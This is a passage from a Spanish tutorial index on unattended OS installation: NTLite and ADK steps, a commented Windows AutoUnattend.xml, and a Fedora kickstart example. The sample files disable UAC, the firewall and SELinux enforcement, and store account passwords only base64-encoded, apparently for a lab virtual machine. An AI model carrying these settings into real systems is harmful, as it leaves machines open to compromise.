\"http://schemas.microsoft.com/WMIConfig/2002/State\" xmlns:xsi= \"http://www.w3.org/2001/XMLSchema-instance\" > <!-- Idioma del usuario final--> <InputLocale> 040a:0000040a </InputLocale> <SystemLocale> es-ES_tradnl </SystemLocale> <UILanguage> es-ES_tradnl </UILanguage> <UILanguageFallback> es-ES_tradnl </UILanguageFallback> <UserLocale> es-ES_tradnl </UserLocale> </component> <component name= \"Microsoft-Windows-Security-SPP-UX\" processorArchitecture= \"wow64\" publicKeyToken= \"31bf3856ad364e35\" language= \"neutral\" versionScope= \"nonSxS\" xmlns:wcm= \"http://schemas.microsoft.com/WMIConfig/2002/State\" xmlns:xsi= \"http://www.w3.org/2001/XMLSchema-instance\" > <!-- especifico que activo manualmente mediante key--> <SkipAutoActivation> true </SkipAutoActivation> </component> <component name= \"Microsoft-Windows-SQMApi\" processorArchitecture= \"wow64\" publicKeyToken= \"31bf3856ad364e35\" language= \"neutral\" versionScope= \"nonSxS\" xmlns:wcm= \"http://schemas.microsoft.com/WMIConfig/2002/State\" xmlns:xsi= \"http://www.w3.org/2001/XMLSchema-instance\" > <CEIPEnabled> 0 </CEIPEnabled> </component> <component name= \"Microsoft-Windows-Shell-Setup\" processorArchitecture= \"wow64\" publicKeyToken= \"31bf3856ad364e35\" language= \"neutral\" versionScope= \"nonSxS\" xmlns:wcm= \"http://schemas.microsoft.com/WMIConfig/2002/State\" xmlns:xsi= \"http://www.w3.org/2001/XMLSchema-instance\" > <ComputerName> mv-virt-w10 </ComputerName> <ProductKey> W269N-WFGWX-YVC9B-4J6C9-T83GX </ProductKey> </component> </settings> <settings pass= \"oobeSystem\" > <component name= \"Microsoft-Windows-Shell-Setup\" processorArchitecture= \"wow64\" publicKeyToken= \"31bf3856ad364e35\" language= \"neutral\" versionScope= \"nonSxS\" xmlns:wcm= \"http://schemas.microsoft.com/WMIConfig/2002/State\" xmlns:xsi= \"http://www.w3.org/2001/XMLSchema-instance\" > <AutoLogon> <Password> <Value> YQBkAG0AaQBuAFAAYQBzAHMAdwBvAHIAZAA= </Value> <PlainText> false </PlainText> </Password> <Username> admin </Username> <Enabled> false </Enabled> </AutoLogon> <OOBE> <!-- Especifica que no se muestra la p\u00e1gina T\u00e9rminos de licencia de software de Microsoft de bienvenida de Windows.--> <HideEULAPage> true </HideEULAPage> <!-- Oculta la p\u00e1gina de registro OEM durante OOBE.--> <HideOEMRegistrationScreen> true </HideOEMRegistrationScreen> <!-- Oculta la p\u00e1gina de inicio de sesi\u00f3n durante OOBE.--> <HideOnlineAccountScreens> true </HideOnlineAccountScreens> <!-- Oculta la pantalla Unirse a la red inal\u00e1mbrica durante la Bienvenida de Windows.--> <HideWirelessSetupInOOBE> true </HideWirelessSetupInOOBE> <!-- tipo de red--> <NetworkLocation> Home </NetworkLocation> <SkipUserOOBE> true </SkipUserOOBE> <SkipMachineOOBE> true </SkipMachineOOBE> <!-- desactivar la configuraci\u00f3n de Express--> <ProtectYourPC> 3 </ProtectYourPC> </OOBE> <UserAccounts> <!-- a\u00f1ado usuiarios --> <LocalAccounts> <LocalAccount wcm:action= \"add\" > <Password> <Value> YQBkAG0AaQBuAFAAYQBzAHMAdwBvAHIAZAA= </Value> <PlainText> false </PlainText> </Password> <Name> admin </Name> <Group> administrators </Group> <DisplayName> admin </DisplayName> </LocalAccount> <LocalAccount wcm:action= \"add\" > <Password> <Value> dQBzAGUAcgBQAGEAcwBzAHcAbwByAGQA </Value> <PlainText> false </PlainText> </Password> <Name> user </Name> <Group> user </Group> <DisplayName> user </DisplayName> </LocalAccount> </LocalAccounts> </UserAccounts> <RegisteredOwner> admin </RegisteredOwner> <DisableAutoDaylightTimeSet> false </DisableAutoDaylightTimeSet> <!-- zona horaria --> <TimeZone> Romance Standard Time </TimeZone> <!-- comandos que quiero que ejecute despues de la imnstalaci\u00f3n --> <FirstLogonCommands> <SynchronousCommand wcm:action= \"add\" > <Order> 4 </Order> <RequiresUserInput> false </RequiresUserInput> <!-- dentro de la iso e creado una carpeta que contiene firefox.exe--> <CommandLine> D:\\aplicaciones\\firefox.exe </CommandLine> <Description> intala firefox </Description> </SynchronousCommand> <SynchronousCommand wcm:action= \"add\" > <Order> 1 </Order> <Description> desabilitar updates </Description> <RequiresUserInput> false </RequiresUserInput> <CommandLine> reg add &quot; HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\WindowsUpdate\\Auto Update &quot; /v AUOptions /t REG_DWORD /d 4 /f </CommandLine> </SynchronousCommand> <SynchronousCommand wcm:action= \"add\" > <Order> 2 </Order> <RequiresUserInput> true </RequiresUserInput> <Description> vision panel control </Description> <CommandLine> reg add &quot; HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ControlPanel &quot; /v StartupPage /t REG_DWORD /d 1 /f </CommandLine> </SynchronousCommand> <SynchronousCommand wcm:action= \"add\" > <Order> 3 </Order> <Description> tama\u00f1o icono panel </Description> <RequiresUserInput> false </RequiresUserInput> <CommandLine> reg add &quot; HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ControlPanel &quot; /v AllItemsIconView /t REG_DWORD /d 0 /f </CommandLine> </SynchronousCommand> <SynchronousCommand wcm:action= \"add\" > <Order> 5 </Order> <Description> instala ccleaner </Description> <RequiresUserInput> true </RequiresUserInput> <CommandLine> D:\\aplicaciones\\ccleaner.exe /S </CommandLine> </SynchronousCommand> <SynchronousCommand wcm:action= \"add\" > <CommandLine> Get-AppxPackage *CandyCrushSodaSaga* | Remove-AppxPackage </CommandLine> <Description> borrar candy </Description> <Order> 6 </Order> <RequiresUserInput> false </RequiresUserInput> </SynchronousCommand> <SynchronousCommand wcm:action= \"add\" > <Order> 7 </Order> <CommandLine> powershell Remove-AppxPackage 9E2F88E3.Twitter_5.8.1.0_x86__wgeqdkkx372wm </CommandLine> <Description> borrar twiter </Description> <RequiresUserInput> false </RequiresUserInput> </SynchronousCommand> </FirstLogonCommands> </component> </settings> <cpi:offlineImage cpi:source= \"wim://pc-jorge/downloads/iso&apos;s/windows10-2/sources/install.wim#Windows 10 Home\" xmlns:cpi= \"urn:schemas-microsoft-com:cpi\" /> </unattend> Desinstalar app y desabilitar updates En la secci\u00f3n Windows-Shell-Setup-neutral/FirstLogonCommands/SyschronousCommand Podemos insertar diferentes comandos por ejemplo: Deshabilitar auto updates. Desinstalar app instaladas por defecto: Opciones app a desinstalar sin que afecte al sistema Get-AppxPackage * 3dbuilder * | Remove-AppxPackage Get-AppxPackage * windowsalarms * | Remove-AppxPackage Get-AppxPackage * windowscommunicationsapps * | Remove-AppxPackage Get-AppxPackage * zunemusic * | Remove-AppxPackage Get-AppxPackage * zunevideo * | Remove-AppxPackage Get-AppxPackage * onenote * | Remove-AppxPackage Get-AppxPackage * people * | Remove-AppxPackage Get-AppxPackage * windowsstore * | Remove-AppxPackage Get-AppxPackage * xboxapp * | Remove-AppxPackage Get-AppxPackage * CandyCrushSodaSaga * | Remove-AppxPackage Get-AppxPackage * Twitter * | Remove-AppxPackage Get-AppxPackage * WindowsMaps * | Remove-AppxPackage Get-AppxPackage * BingFinance * | Remove-AppxPackage Get-AppxPackage * BingSports * | Remove-AppxPackage Get-AppxPackage * MicrosoftOfficeHub * | Remove-AppxPackage Get-AppxPackage * MicrosoftSolitaireCollection * | Remove-AppxPackage Get-AppxPackage * Sway * | Remove-AppxPackage Get-AppxPackage * SkypeApp * | Remove-AppxPackage Guardar archivo en iso y montar Por \u00faltimo ya solo queda guardar el archivo en la ra\u00edz de la iso y montar. Abrimos: Entorno de herramientas de implementaci\u00f3n y creaci\u00f3n im\u00e1genes Comando para montar. oscdimg -n -m -bF: \\U sers \\j orge \\D ownloads \\i so 's\\win10\\boot\\etfsboot.com F:\\Users\\jorge\\Downloads\\iso' s \\w in10 F: \\U sers \\j orge \\D ownloads \\w in10.iso Explicacion: oscdimg -n -m -bF:\\Users\\jorge\\Downloads\\iso's\\win10\\boot\\etfsboot.com Es la ruta al archivo booteable de dentro de la iso F:\\Users\\jorge\\Downloads\\iso's\\win10 Es la direcci\u00f3n de la carpeta de la iso F:\\Users\\jorge\\Downloads\\win10.iso Direcci\u00f3n donde creo la nueva iso","title":"Desatendida windows"},{"location":"desatendidas/desatendida-windows/#formas-de-crear","text":"Tenemos 3 maneras de crear una desatendida en windows ntlite un programa que tiene versi\u00f3n gratuita y de pago. Muy f\u00e1cil de usar En gratuito no puedes modificar discos y particiones, por defecto utiliza todo el disco. Muy recomendable si quieres instalar en todo el disco. adk es la actualizaci\u00f3n de aik. Dif\u00edcil manejo hay que tener conocimientos de controladores o mirar mucha documentaci\u00f3n de ayuda. En este caso partiremos de una plantilla. Todas las posibilidades de configuraci\u00f3n. Crear archivo AutoUnattend.xml manualmente. Nivel dios todo poderoso, hay que dedicarle muchas horas a documentarse. Esta manera la evitaremos.","title":"Formas de crear"},{"location":"desatendidas/desatendida-windows/#links-de-descarga","text":"ntlite Windows Assessment and Deployment Kit ( adk ) Kit de instalaci\u00f3n automatizada de Windows ( waik )","title":"Links de descarga"},{"location":"desatendidas/desatendida-windows/#ntlite","text":"Empecemos por lo f\u00e1cil.","title":"Ntlite"},{"location":"desatendidas/desatendida-windows/#1-descargar-herrmientas","text":"Descargar ntlite e instalar, no tiene complicaci\u00f3n. Descargamos iso de windows","title":"1 Descargar herrmientas"},{"location":"desatendidas/desatendida-windows/#2-abrir-iso-y-copiar-en-carpeta","text":"Clic derecho en la iso descargada y descomprimir en carpeta. En mi caso la iso se llama win10 y \u201cextraer en carpeta win10/\u201d","title":"2 Abrir iso y copiar en carpeta"},{"location":"desatendidas/desatendida-windows/#3-abrir-ntlite-y-anadir-imagen","text":"click en a\u00f1adir \u2192 buscar carpeta que hemos descomprimido la imagen.","title":"3 abrir ntlite y a\u00f1adir imagen"},{"location":"desatendidas/desatendida-windows/#4-abrir-windows-que-configurar","text":"En mi caso la iso solo tiene windows 10 home pero si os descargais una iso de microsoft tendr\u00e1 varias versiones del windows elegido Tarda unos minutos lo aviso entre 2 y 4 normalmente","title":"4 abrir windows que configurar"},{"location":"desatendidas/desatendida-windows/#5-configurar-iso","text":"A continuaci\u00f3n nos saldr\u00e1 una barra lateral con las diferentes opciones de configuraci\u00f3n. Tenemos varias opciones \u00fatiles por aqu\u00ed:","title":"5 Configurar iso"},{"location":"desatendidas/desatendida-windows/#eliminar","text":"eliminar/componentes \u2192 podemos eliminar las app de windows por defecto tipo bing o twitter etc..","title":"Eliminar"},{"location":"desatendidas/desatendida-windows/#configurar","text":"configurar/configurar \u2192 podemos poner que pregunte antes de descargar actualizaciones por ejemplo, entre muchas otras cosas. configura/servicios \u2192 activas y desactivas servicios por defecto","title":"Configurar"},{"location":"desatendidas/desatendida-windows/#integrar","text":"integrar/actualizaciones \u2192 si te descargas aplicaciones manualmente puedes a\u00f1adirlas para que el sistema las integre en la instalaci\u00f3n. integrar/controladores \u2192 a\u00f1ades drivers de los dispositivos deseados.","title":"Integrar"},{"location":"desatendidas/desatendida-windows/#automatizar","text":"Aqu\u00ed es la secci\u00f3n donde evitamos que sea un pesado el instalador preguntandonos pasos.","title":"Automatizar"},{"location":"desatendidas/desatendida-windows/#automatizardesatendido","text":"Primero marcamos pesta\u00f1a activar arriba a la izquierda. Seguiremos a\u00f1adiendo, idioma, idioma teclado, saltar ventanas, zona horaria, usuarios, etc.. En mi caso hecho una configuraci\u00f3n simple sin clave de activaci\u00f3n, si se desea activar windows es muy intuitivo solo hay que a\u00f1adir dicha clave en los casillas correspondientes. Podremos configurar casi todo menos las particiones ya que estamos utilizando versi\u00f3n gratuita, en la versi\u00f3n de pago eres libre a partir de 40\u20ac actualmente.","title":"Automatizar/desatendido"},{"location":"desatendidas/desatendida-windows/#postinstalacion","text":"Aqu\u00ed nos permite agregar scripts o ejecutables para que se instalen justo despu\u00e9s de la instalaci\u00f3n. En mi caso he a\u00f1adido el ejecutable de firefox. A\u00f1adir \u2192 seleccionas ejecutable","title":"Postinstalaci\u00f3n"},{"location":"desatendidas/desatendida-windows/#final","text":"Por \u00faltimo nos queda montar la iso en el apartado aplicar. Seleccionamos crear iso y procesar. Tardar\u00e1 un rato es un poco lento unos 5 - 10 minutos. Pero bueno es tiempo que nos ahorraremos en un futuro instalando. Una vez creada la iso solo nos queda quemarla en un pen o insertar en m\u00e1quina virtual y a esperar que se instala todo solito.","title":"Final"},{"location":"desatendidas/desatendida-windows/#adk","text":"ADK nos genera un archivo AutoUnattend.xml que luego a\u00f1adiremos a la ra\u00edz de la iso.","title":"ADK"},{"location":"desatendidas/desatendida-windows/#descargar-herrmientas","text":"Descargar adk e instalar Descargamos iso de windows","title":"Descargar herrmientas"},{"location":"desatendidas/desatendida-windows/#montamos-imagen-en-carpeta","text":"click derecho en im\u00e1gen extraer en carpeta a elegir","title":"Montamos imagen en carpeta"},{"location":"desatendidas/desatendida-windows/#abrimos-adk","text":"administrador de im\u00e1genes de sistemas de windows Nombre cortito han elegido","title":"abrimos ADK"},{"location":"desatendidas/desatendida-windows/#empezar-a-configurar","text":"","title":"Empezar a configurar"},{"location":"desatendidas/desatendida-windows/#extraer-imagen","text":"En el recuadro inferior izquierdo \u201cImagen de windows\u201d click derecho seleccionar imagen de windows Buscamos en la carpeta que hemos extra\u00eddo la iso el archivo install.wim ~/imagen/sources/install.wim Tardara un poco, paciencia.","title":"Extraer imagen"},{"location":"desatendidas/desatendida-windows/#archivo-de-respuesta","text":"En el recuadro superior central \u201cArchivo de respuesta\u201d click derecho seleccionar nuevo archivo de respuesta Quedar\u00e1 as\u00ed. Abajo todos los componentes a a\u00f1adir al archivo y arriba iremos configurando lo requerido.","title":"Archivo de respuesta"},{"location":"desatendidas/desatendida-windows/#anadir-componentes-a-archivo-de-respuesta","text":"Para a\u00f1adir un componente click derecho sobre el y seleccionamos la posici\u00f3n a insertar.","title":"A\u00f1adir componentes a archivo de respuesta"},{"location":"desatendidas/desatendida-windows/#1-windowspe","text":"International-core-winPe-neutral/setupUILanguage windows-setup-neutral/diskConfiguration/disk/createPartition windows-setup-neutral/diskConfiguration/disk/ModifiPartition windows-setup-neutral/imageinstall/osimage/installTo windows-setup-neutral/UserData/ProductKey","title":"1 windowsPE"},{"location":"desatendidas/desatendida-windows/#2-offlineservicing","text":"Windows-Lua-Settings-neutral","title":"2 offlineServicing"},{"location":"desatendidas/desatendida-windows/#3-generalize","text":"Windows-Securiti-SPP-neutral","title":"3 generalize"},{"location":"desatendidas/desatendida-windows/#4-specialize","text":"Windows-International-core-neutral Windows-Security-SPP-UX-neutral Windows-Shell-setup-neutral Windows-SQMApi-neutral","title":"4 specialize"},{"location":"desatendidas/desatendida-windows/#7-oobesystem","text":"Windows-Shell-Setup-neutral/Autolog/Password (esta opci\u00f3n si quieres a\u00f1adir comandos al final de la instalaci\u00f3n) - Windows-Shell-Setup-neutral/FirstLogonCommands/SyschronousCommand Windows-Shell-Setup-neutral/OOBE Windows-Shell-Setup-neutral/UserAcounts/localAccounts","title":"7 oobeSystem"},{"location":"desatendidas/desatendida-windows/#configurar-componentes","text":"( Para ver la ayuda de los par\u00e1metros a configurar click derecho ayuda) Como es muy largo de explicar dejo el archivo de respuesta comentado a continuaci\u00f3n y buscamos poco a poco cada par\u00e1metro. Tambi\u00e9n puedes copiar el siguiente archivo, abrirlo como Autounattend.xml y modificar al gusto, es algo complejo al principio. AutoUnattend.xml <?xml version=\"1.0\" encoding=\"utf-8\"?> <unattend xmlns= \"urn:schemas-microsoft-com:unattend\" > <settings pass= \"windowsPE\" > <component name= \"Microsoft-Windows-International-Core-WinPE\" processorArchitecture= \"amd64\" publicKeyToken= \"31bf3856ad364e35\" language= \"neutral\" versionScope= \"nonSxS\" xmlns:wcm= \"http://schemas.microsoft.com/WMIConfig/2002/State\" xmlns:xsi= \"http://www.w3.org/2001/XMLSchema-instance\" > <!-- Idioma de teclado e instalaci\u00f3n --> <SetupUILanguage> <UILanguage> es-ES </UILanguage> </SetupUILanguage> <InputLocale> 040a:0000040a </InputLocale> <SystemLocale> es-ES </SystemLocale> <UILanguage> es-ES </UILanguage> <UILanguageFallback> es-ES </UILanguageFallback> <UserLocale> es-ES_tradnl </UserLocale> </component> <!-- fin Idioma de teclado e instalaci\u00f3n --> <component name= \"Microsoft-Windows-Setup\" processorArchitecture= \"amd64\" publicKeyToken= \"31bf3856ad364e35\" language= \"neutral\" versionScope= \"nonSxS\" xmlns:wcm= \"http://schemas.microsoft.com/WMIConfig/2002/State\" xmlns:xsi= \"http://www.w3.org/2001/XMLSchema-instance\" > <DiskConfiguration> <Disk wcm:action= \"add\" > <ModifyPartitions> <ModifyPartition wcm:action= \"add\" > <!-- Active que sea la partici\u00f3n activa al arrancar--> <Active> true </Active> <Format> NTFS </Format> <Label> os </Label> <Letter> C </Letter> <Order> 1 </Order> <PartitionID> 1 </PartitionID> </ModifyPartition> </ModifyPartitions> <CreatePartitions> <CreatePartition wcm:action= \"add\" > <!-- extend Que ocupe todo el disco--> <Extend> true </Extend> <Order> 1 </Order> <Type> Primary </Type> </CreatePartition> </CreatePartitions> <!-- disco 0 --> <DiskID> 0 </DiskID> <!-- borre todo el disco--> <WillWipeDisk> true </WillWipeDisk> </Disk> </DiskConfiguration> <ImageInstall> <OSImage> <InstallTo> <!-- Instalar en disco 0 partici\u00f3n 1--> <DiskID> 0 </DiskID> <PartitionID> 1 </PartitionID> </InstallTo> <!-- Especifica que se instalara windows en las paticiones que e descrito--> <InstallToAvailablePartition> false </InstallToAvailablePartition> </OSImage> </ImageInstall> <UserData> <ProductKey> <Key> W269N-WFGWX-YVC9B-4J6C9-T83GX </Key> </ProductKey> <!-- especifica que se acepta automaticamente la clave--> <AcceptEula> true </AcceptEula> <FullName> admin </FullName> </UserData> </component> </settings> <settings pass= \"offlineServicing\" > <component name= \"Microsoft-Windows-LUA-Settings\" processorArchitecture= \"amd64\" publicKeyToken= \"31bf3856ad364e35\" language= \"neutral\" versionScope= \"nonSxS\" xmlns:wcm= \"http://schemas.microsoft.com/WMIConfig/2002/State\" xmlns:xsi= \"http://www.w3.org/2001/XMLSchema-instance\" > <EnableLUA> false </EnableLUA> </component> </settings> <settings pass= \"generalize\" > <component name= \"Microsoft-Windows-Security-SPP\" processorArchitecture= \"amd64\" publicKeyToken= \"31bf3856ad364e35\" language= \"neutral\" versionScope= \"nonSxS\" xmlns:wcm= \"http://schemas.microsoft.com/WMIConfig/2002/State\" xmlns:xsi= \"http://www.w3.org/2001/XMLSchema-instance\" > <!-- Especifica que la licenciab no cambiaa y es valida--> <SkipRearm> 1 </SkipRearm> </component> </settings> <settings pass= \"specialize\" > <component name= \"Microsoft-Windows-International-Core\" processorArchitecture= \"wow64\" publicKeyToken= \"31bf3856ad364e35\" language= \"neutral\" versionScope= \"nonSxS\" xmlns:wcm= \"http://schemas.microsoft.com/WMIConfig/2002/State\" xmlns:xsi= \"http://www.w3.org/2001/XMLSchema-instance\" > <!-- Idioma del usuario final--> <InputLocale> 040a:0000040a </InputLocale> <SystemLocale> es-ES_tradnl </SystemLocale> <UILanguage> es-ES_tradnl </UILanguage> <UILanguageFallback> es-ES_tradnl </UILanguageFallback> <UserLocale> es-ES_tradnl </UserLocale> </component> <component name= \"Microsoft-Windows-Security-SPP-UX\" processorArchitecture= \"wow64\" publicKeyToken= \"31bf3856ad364e35\" language= \"neutral\" versionScope= \"nonSxS\" xmlns:wcm= \"http://schemas.microsoft.com/WMIConfig/2002/State\" xmlns:xsi= \"http://www.w3.org/2001/XMLSchema-instance\" > <!-- especifico que activo manualmente mediante key--> <SkipAutoActivation> true </SkipAutoActivation> </component> <component name= \"Microsoft-Windows-SQMApi\" processorArchitecture= \"wow64\" publicKeyToken= \"31bf3856ad364e35\" language= \"neutral\" versionScope= \"nonSxS\" xmlns:wcm= \"http://schemas.microsoft.com/WMIConfig/2002/State\" xmlns:xsi= \"http://www.w3.org/2001/XMLSchema-instance\" > <CEIPEnabled> 0 </CEIPEnabled> </component> <component name= \"Microsoft-Windows-Shell-Setup\" processorArchitecture= \"wow64\" publicKeyToken= \"31bf3856ad364e35\" language= \"neutral\" versionScope= \"nonSxS\" xmlns:wcm= \"http://schemas.microsoft.com/WMIConfig/2002/State\" xmlns:xsi= \"http://www.w3.org/2001/XMLSchema-instance\" > <ComputerName> mv-virt-w10 </ComputerName> <ProductKey> W269N-WFGWX-YVC9B-4J6C9-T83GX </ProductKey> </component> </settings> <settings pass= \"oobeSystem\" > <component name= \"Microsoft-Windows-Shell-Setup\" processorArchitecture= \"wow64\" publicKeyToken= \"31bf3856ad364e35\" language= \"neutral\" versionScope= \"nonSxS\" xmlns:wcm= \"http://schemas.microsoft.com/WMIConfig/2002/State\" xmlns:xsi= \"http://www.w3.org/2001/XMLSchema-instance\" > <AutoLogon> <Password> <Value> YQBkAG0AaQBuAFAAYQBzAHMAdwBvAHIAZAA= </Value> <PlainText> false </PlainText> </Password> <Username> admin </Username> <Enabled> false </Enabled> </AutoLogon> <OOBE> <!-- Especifica que no se muestra la p\u00e1gina T\u00e9rminos de licencia de software de Microsoft de bienvenida de Windows.--> <HideEULAPage> true </HideEULAPage> <!-- Oculta la p\u00e1gina de registro OEM durante OOBE.--> <HideOEMRegistrationScreen> true </HideOEMRegistrationScreen> <!-- Oculta la p\u00e1gina de inicio de sesi\u00f3n durante OOBE.--> <HideOnlineAccountScreens> true </HideOnlineAccountScreens> <!-- Oculta la pantalla Unirse a la red inal\u00e1mbrica durante la Bienvenida de Windows.--> <HideWirelessSetupInOOBE> true </HideWirelessSetupInOOBE> <!-- tipo de red--> <NetworkLocation> Home </NetworkLocation> <SkipUserOOBE> true </SkipUserOOBE> <SkipMachineOOBE> true </SkipMachineOOBE> <!-- desactivar la configuraci\u00f3n de Express--> <ProtectYourPC> 3 </ProtectYourPC> </OOBE> <UserAccounts> <!-- a\u00f1ado usuiarios --> <LocalAccounts> <LocalAccount wcm:action= \"add\" > <Password> <Value> YQBkAG0AaQBuAFAAYQBzAHMAdwBvAHIAZAA= </Value> <PlainText> false </PlainText> </Password> <Name> admin </Name> <Group> administrators </Group> <DisplayName> admin </DisplayName> </LocalAccount> <LocalAccount wcm:action= \"add\" > <Password> <Value> dQBzAGUAcgBQAGEAcwBzAHcAbwByAGQA </Value> <PlainText> false </PlainText> </Password> <Name> user </Name> <Group> user </Group> <DisplayName> user </DisplayName> </LocalAccount> </LocalAccounts> </UserAccounts> <RegisteredOwner> admin </RegisteredOwner> <DisableAutoDaylightTimeSet> false </DisableAutoDaylightTimeSet> <!-- zona horaria --> <TimeZone> Romance Standard Time </TimeZone> <!-- comandos que quiero que ejecute despues de la imnstalaci\u00f3n --> <FirstLogonCommands> <SynchronousCommand wcm:action= \"add\" > <Order> 4 </Order> <RequiresUserInput> false </RequiresUserInput> <!-- dentro de la iso e creado una carpeta que contiene firefox.exe--> <CommandLine> D:\\aplicaciones\\firefox.exe </CommandLine> <Description> intala firefox </Description> </SynchronousCommand> <SynchronousCommand wcm:action= \"add\" > <Order> 1 </Order> <Description> desabilitar updates </Description> <RequiresUserInput> false </RequiresUserInput> <CommandLine> reg add &quot; HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\WindowsUpdate\\Auto Update &quot; /v AUOptions /t REG_DWORD /d 4 /f </CommandLine> </SynchronousCommand> <SynchronousCommand wcm:action= \"add\" > <Order> 2 </Order> <RequiresUserInput> true </RequiresUserInput> <Description> vision panel control </Description> <CommandLine> reg add &quot; HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ControlPanel &quot; /v StartupPage /t REG_DWORD /d 1 /f </CommandLine> </SynchronousCommand> <SynchronousCommand wcm:action= \"add\" > <Order> 3 </Order> <Description> tama\u00f1o icono panel </Description> <RequiresUserInput> false </RequiresUserInput> <CommandLine> reg add &quot; HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ControlPanel &quot; /v AllItemsIconView /t REG_DWORD /d 0 /f </CommandLine> </SynchronousCommand> <SynchronousCommand wcm:action= \"add\" > <Order> 5 </Order> <Description> instala ccleaner </Description> <RequiresUserInput> true </RequiresUserInput> <CommandLine> D:\\aplicaciones\\ccleaner.exe /S </CommandLine> </SynchronousCommand> <SynchronousCommand wcm:action= \"add\" > <CommandLine> Get-AppxPackage *CandyCrushSodaSaga* | Remove-AppxPackage </CommandLine> <Description> borrar candy </Description> <Order> 6 </Order> <RequiresUserInput> false </RequiresUserInput> </SynchronousCommand> <SynchronousCommand wcm:action= \"add\" > <Order> 7 </Order> <CommandLine> powershell Remove-AppxPackage 9E2F88E3.Twitter_5.8.1.0_x86__wgeqdkkx372wm </CommandLine> <Description> borrar twiter </Description> <RequiresUserInput> false </RequiresUserInput> </SynchronousCommand> </FirstLogonCommands> </component> </settings> <cpi:offlineImage cpi:source= \"wim://pc-jorge/downloads/iso&apos;s/windows10-2/sources/install.wim#Windows 10 Home\" xmlns:cpi= \"urn:schemas-microsoft-com:cpi\" /> </unattend>","title":"Configurar componentes"},{"location":"desatendidas/desatendida-windows/#desinstalar-app-y-desabilitar-updates","text":"En la secci\u00f3n Windows-Shell-Setup-neutral/FirstLogonCommands/SyschronousCommand Podemos insertar diferentes comandos por ejemplo: Deshabilitar auto updates. Desinstalar app instaladas por defecto: Opciones app a desinstalar sin que afecte al sistema Get-AppxPackage * 3dbuilder * | Remove-AppxPackage Get-AppxPackage * windowsalarms * | Remove-AppxPackage Get-AppxPackage * windowscommunicationsapps * | Remove-AppxPackage Get-AppxPackage * zunemusic * | Remove-AppxPackage Get-AppxPackage * zunevideo * | Remove-AppxPackage Get-AppxPackage * onenote * | Remove-AppxPackage Get-AppxPackage * people * | Remove-AppxPackage Get-AppxPackage * windowsstore * | Remove-AppxPackage Get-AppxPackage * xboxapp * | Remove-AppxPackage Get-AppxPackage * CandyCrushSodaSaga * | Remove-AppxPackage Get-AppxPackage * Twitter * | Remove-AppxPackage Get-AppxPackage * WindowsMaps * | Remove-AppxPackage Get-AppxPackage * BingFinance * | Remove-AppxPackage Get-AppxPackage * BingSports * | Remove-AppxPackage Get-AppxPackage * MicrosoftOfficeHub * | Remove-AppxPackage Get-AppxPackage * MicrosoftSolitaireCollection * | Remove-AppxPackage Get-AppxPackage * Sway * | Remove-AppxPackage Get-AppxPackage * SkypeApp * | Remove-AppxPackage","title":"Desinstalar app y desabilitar updates"},{"location":"desatendidas/desatendida-windows/#guardar-archivo-en-iso-y-montar","text":"Por \u00faltimo ya solo queda guardar el archivo en la ra\u00edz de la iso y montar. Abrimos: Entorno de herramientas de implementaci\u00f3n y creaci\u00f3n im\u00e1genes Comando para montar. oscdimg -n -m -bF: \\U sers \\j orge \\D ownloads \\i so 's\\win10\\boot\\etfsboot.com F:\\Users\\jorge\\Downloads\\iso' s \\w in10 F: \\U sers \\j orge \\D ownloads \\w in10.iso Explicacion: oscdimg -n -m -bF:\\Users\\jorge\\Downloads\\iso's\\win10\\boot\\etfsboot.com Es la ruta al archivo booteable de dentro de la iso F:\\Users\\jorge\\Downloads\\iso's\\win10 Es la direcci\u00f3n de la carpeta de la iso F:\\Users\\jorge\\Downloads\\win10.iso Direcci\u00f3n donde creo la nueva iso","title":"Guardar archivo en iso y montar"},{"location":"desatendidas/kikstart/","text":"kickstart ( Es solo compatible con el instalador anaconda ) Para generar una imagen de una instalaci\u00f3n desatendida, primero hay que generar un archivo de los pasos a seguir en la instalaci\u00f3n, insertarlo en la imagen y modificar el menu de la imagen para que lo detecte. Generar pasos de instalaci\u00f3n Hay que generar un archivo con los pasos de la instalaci\u00f3n, lo llamare kicktart.cfg . Tenemos 2 maneras una aplicaci\u00f3n gr\u00e1fica en derivados de Red Had o manualmente. La aplicaci\u00f3n: Esta en los repositorios sudo dnf install -y system-config-kickstart . Es muy intuitiva solo hay que indicar lo que quieres, red, paswords, paquetes, modo de instalaci\u00f3n, etc.. al guardar genera el archivo que necesitamos. Manualmente: Pues tienes mas trabajo, pero tambi\u00e9n mas opciones, lo mejor es un combo de la aplicaci\u00f3n, y a\u00f1adirle alg\u00fan par\u00e1metro mas. Documentaci\u00f3n: wiki fedora kickstart docs Ejemplo archivo ks.cfg #platform=x86, AMD64 o Intel EM64T #version=DEVEL # Install: tipo de instalacion url: netinst install url --url = \"ftp://ftp.cica.es/fedora/linux/releases/29/Workstation/x86_64/os\" # Keyboard layouts keyboard 'es' # Root password rootpw --iscrypted $6$dtciO6uRuALooO .4 $0 oFR1GxiI0W57fXywalmIKLtILbCSoeI2JqMuztbhq135NPnEzyq8O56RpwjLvAns5qx03KeI1kk7OrX4IuFE # user user --name = jorge --groups = wheel --iscrypted $6$dtciO6uRuALooO .4 $0 oFR1GxiI0W57fXywalmIKLtILbCSoeI2JqMuztbhq13 # network dhcp network --onboot yes --device eth0 --bootproto dhcp --noipv6 # System language lang es_ES.UTF-8 # Firewall configuration firewall --disabled # Reboot after installation reboot # System timezone timezone --utc Europe/Madrid # System authorization information authconfig --enableshadow --passalgo = sha512 --enablefingerprint # Modo de instalacion text #graphical firstboot --disable # SELinux configuration selinux --permissive # Que particiones borrar clearpart --all # Tabla de particiones part swap --fstype = \"swap\" --recommended part / --fstype = \"ext4\" --grow --size = 1 # System bootloader configuration bootloader --location = mbr --driveorder = vda --append = \"rhgb quiet\" # Que ejecutar al acabar la instalacion %post systemctl set-default graphical.target # por defecto arranque gr\u00e1fico dnf -y update dnf install -y nano dnf install -y grub-customizer %end # Paquetes que se instalaran en la instalacion %packages @base-x # x windows @gnome-desktop # Escritorio deseado %end Para encriptar las contrase\u00f1as manualmente: python3 -c 'import 